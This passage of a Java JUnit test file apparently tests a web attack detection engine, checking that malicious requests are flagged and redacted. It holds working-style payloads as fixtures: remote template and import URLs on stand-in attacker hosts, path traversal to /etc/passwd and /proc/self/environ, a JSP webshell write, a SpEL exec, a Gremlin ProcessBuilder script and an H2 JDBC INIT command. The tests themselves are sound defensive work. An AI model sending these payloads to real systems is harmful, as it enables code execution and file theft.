            "/rest/tinymce/1/macro/preview",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("remote-url", result.orElseThrow().details().get("targetType"));
  }

  @Test
  void ignoresBenignMacroPreviewMediaUrlAndTemplateName() {
    var body =
        """
        {"macro":{"name":"widget","params":{
          "url":"https://www.viddler.com/v/23464dc6",
          "_template":"widget-default.vm"
        }}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/rest/tinymce/1/macro/preview",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresTemplateSourceOutsideTemplateControlContext() {
    var context =
        new RequestContext(
            "POST",
            "/api/preferences",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            "{\"_template\":\"https://attacker.example/poc.vm\"}");

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRemoteDecoratorTemplateSourceParameter() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/forgotPassword/StatsSinceStart",
            "statsDecoratorLocation=http://evil.example/ofbiz/payload.xml",
            Map.of("statsDecoratorLocation", List.of("http://evil.example/ofbiz/payload.xml")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("statsDecoratorLocation", result.orElseThrow().details().get("parameter"));
    assertEquals("remote-url", result.orElseThrow().details().get("targetType"));
    assertEquals("[redacted]", result.orElseThrow().request().parameters().get("statsDecoratorLocation").get(0));
    assertEquals("statsDecoratorLocation=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void detectsColdFusionMetadataClassnameTemplateSourceParameter() {
    var target = "../../../../../../../../proc/self/environ";
    var payload = "{\"_metadata\":{\"classname\":\"" + target + "\"}}";
    var context =
        new RequestContext(
            "POST",
            "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc",
            "method=foo&_cfclient=true&_variables=" + payload,
            Map.of("_variables", List.of(payload)),
            Map.of("content-type", "application/x-www-form-urlencoded", "user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("_variables.classname", result.orElseThrow().details().get("parameter"));
    assertEquals("path-traversal", result.orElseThrow().details().get("targetType"));
    assertEquals(String.valueOf(target.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("_variables"));
    assertTrue(result.orElseThrow().request().query().contains("_variables=[redacted]"));
    assertFalse(result.orElseThrow().request().query().contains("proc/self/environ"));
  }

  @Test
  void detectsLocaleTraversalTemplateSourceParameter() {
    var target = "../../../../../../../../../../etc/passwd\u0000en";
    var context =
        new RequestContext(
            "GET",
            "/CFIDE/administrator/enter.cfm",
            "locale=../../../../../../../../../../etc/passwd%00en",
            Map.of("locale", List.of(target)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("locale", result.orElseThrow().details().get("parameter"));
    assertEquals("path-traversal", result.orElseThrow().details().get("targetType"));
    assertEquals(String.valueOf(target.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("locale"));
    assertEquals("locale=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignLocaleTemplateSourceParameter() {
    var context =
        new RequestContext(
            "GET",
            "/CFIDE/administrator/enter.cfm",
            "locale=en_US",
            Map.of("locale", List.of("en_US")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignMetadataClassnameTemplateSourceParameter() {
    var payload = "{\"_metadata\":{\"classname\":\"com.example.SafeDto\"}}";
    var context =
        new RequestContext(
            "POST",
            "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc",
            "method=foo&_cfclient=true&_variables=" + payload,
            Map.of("_variables", List.of(payload)),
            Map.of("content-type", "application/x-www-form-urlencoded", "user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresRemoteDecoratorLocationOutsideTemplateControlContext() {
    var context =
        new RequestContext(
            "POST",
            "/api/preferences",
            "statsDecoratorLocation=http://evil.example/ofbiz/payload.xml",
            Map.of("statsDecoratorLocation", List.of("http://evil.example/ofbiz/payload.xml")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRemoteImportIntoScriptWriteTarget() {
    var parameters = new LinkedHashMap<String, List<String>>();
    parameters.put("DATAFILE_LOCATION", List.of("http://attacker/rcereport.csv"));
    parameters.put(
        "DATAFILE_SAVE", List.of("./applications/accounting/webapp/accounting/index.jsp"));
    parameters.put("DATAFILE_IS_URL", List.of("true"));
    parameters.put("DEFINITION_LOCATION", List.of("http://attacker/rceschema.xml"));
    parameters.put("DEFINITION_IS_URL", List.of("true"));
    parameters.put("DEFINITION_NAME", List.of("rce"));
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/forgotPassword/viewdatafile",
            "DATAFILE_LOCATION=http://attacker/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://attacker/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce",
            parameters,
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_remote_import_script_write");
    assertEquals("DATAFILE_LOCATION", result.orElseThrow().details().get("sourceParameter"));
    assertEquals("DATAFILE_SAVE", result.orElseThrow().details().get("targetParameter"));
    assertEquals("jsp", result.orElseThrow().details().get("targetType"));
    assertEquals("2", result.orElseThrow().details().get("remoteSourceCount"));
    assertEquals("[redacted]", result.orElseThrow().request().parameters().get("DATAFILE_SAVE").get(0));
    assertEquals(
        "DATAFILE_LOCATION=[redacted]&DATAFILE_SAVE=[redacted]&DATAFILE_IS_URL=true&DEFINITION_LOCATION=[redacted]&DEFINITION_IS_URL=true&DEFINITION_NAME=rce",
        result.orElseThrow().request().query());
  }

  @Test
  void ignoresLocalImportIntoScriptTarget() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/viewdatafile",
            "",
            Map.of(
                "DATAFILE_LOCATION",
                List.of("./runtime/import/report.csv"),
                "DATAFILE_SAVE",
                List.of("./applications/accounting/webapp/accounting/index.jsp"),
                "DATAFILE_IS_URL",
                List.of("false")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresWebrootSnapshotRepositoryWithoutScriptSelector() {
    var body =
        "{\"type\":\"fs\",\"settings\":{\"location\":\"/usr/local/tomcat/webapps/backups\"}}";
    var context =
        new RequestContext(
            "PUT",
            "/_snapshot/daily-backup",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresDynamicScriptConfigOutsideConfigShape() {
    var context =
        new RequestContext(
            "POST",
            "/api/render",
            "",
            Map.of("message", List.of("#{T(java.lang.Runtime).getRuntime().exec('id')}")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  private static String hugeGraphGremlinScript() {
    return "Thread thread = Thread.currentThread();"
        + "Class clz = Class.forName(\"java.lang.Thread\");"
        + "java.lang.reflect.Field field = clz.getDeclaredField(\"name\");"
        + "field.setAccessible(true);"
        + "field.set(thread, \"SL7\");"
        + "Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");"
        + "java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);"
        + "java.util.List command = java.util.Arrays.asList(\"id\");"
        + "Object processBuilderInstance = constructor.newInstance(command);"
        + "java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");"
        + "org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());";
  }

  private static String dataEaseH2Configuration() {
    var jdbc =
        "jdbc:h2:mem:pwn;MODE=MSSQLServer;INIT=CREATE ALIAS EXEC AS $$void exec()"
            + " throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"touch\","
            + "\"/tmp/pwned\"})\\; }$$\\;CALL EXEC()";
    return "{\"jdbc\":\""
        + jsonString(jdbc)
        + "\",\"username\":\"\",\"password\":\"\",\"driver\":\"org.h2.Driver\"}";
  }
}
